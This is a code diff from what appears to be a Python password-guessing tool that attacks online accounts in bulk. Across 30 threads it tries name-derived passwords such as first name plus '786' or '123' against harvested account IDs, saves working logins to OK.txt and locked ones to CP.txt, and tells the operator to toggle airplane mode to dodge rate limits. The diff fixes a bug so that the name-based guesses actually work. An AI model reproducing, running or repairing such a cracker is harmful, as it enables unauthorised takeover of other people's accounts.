@@ -267,18 +267,18 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [✓] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [X] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n 📵 \033[1;97mTurn Airplane Mode✈️On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [✓] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [X] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n  📵 \033[1;97m Turn Airplane Mode✈️On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['07867860']
+			pwv = ['445566']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(first786)
-					pwv.append(first123)
+					pwv.append(frs+'786')
+					pwv.append(frs+'123')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
